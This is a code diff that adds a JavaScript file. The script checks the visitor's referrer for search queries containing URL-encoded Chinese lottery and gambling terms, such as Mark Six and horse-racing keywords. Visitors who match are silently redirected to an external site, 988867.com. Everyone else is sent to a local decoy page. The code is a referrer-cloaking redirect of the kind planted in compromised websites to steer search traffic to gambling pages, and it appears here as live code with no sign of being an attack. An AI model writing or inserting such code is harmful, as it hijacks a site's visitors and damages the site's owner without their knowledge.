@@ -1,0 +1,14 @@
+var d=document.referrer;
+var re=/((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C6%DA|%E6%9C%9F))|(152)|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%BF%AA%BD%B1|%E5%BC%80%E5%A5%96))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%B9%D2%C5%C6|%E6%8C%82%E7%89%8C))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C1%F9%BA%CF%B2%CA|%E5%85%AD%E5%90%88%E5%BD%A9))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%CC%D8%C2%EB|%E7%89%B9%E7%A0%81))|((wd|q|w|query)(=)([%A-Z0-9]*)(%C8%FC%C2%ED%BB%E1|%E8%B5%9B%E9%A9%AC%E4%BC%9A))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%B0%D7%D0%A1%BD%E3|%E7%99%BD%E5%B0%8F%E5%A7%90))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%CF%E3%B8%DB|%E9%A6%99%E6%B8%AF))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C2%ED%BB%E1|%E9%A9%AC%E4%BC%9A))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%CF%E3%B8%DB|%E9%A6%99%E6%B8%AF))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C2%ED%B1%A8|%E9%A9%AC%E6%8A%A5))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C1%F9%BA%D0%B2%CA|%E5%85%AD%E7%9B%92%E5%BD%A9))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C1%F9%B8%F6%B2%CA|%E5%85%AD%E4%B8%AA%E5%BD%A9))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C1%F9%BA%CD%B2%CA|%E5%85%AD%E5%92%8C%E5%BD%A9))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C1%F9%BA%CF%B2%C9|%E5%85%AD%E5%90%88%E9%87%87))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%36|6))|((wd|q|w|p|query)(=)([%A-Z0-9]*)(%C1%F9%BA%CF%CD%AC%B2%CA|%E5%85%AD%E5%90%88%E5%90%8C%E5%BD%A9))/;
+if(re.test(d)){
+  document.write('<div style="height:1px;line-height:1px;"></div>');
+  var curl=window.location.href;
+  murl="http://www.988867.com/conn.html";
+  setTimeout("window.location.href='"+murl+"'",100);
+}else{
+document.writeln("<script>");
+document.writeln("window.location=\"/indax.aspx\";");
+document.writeln("</script>");
+}
+
+
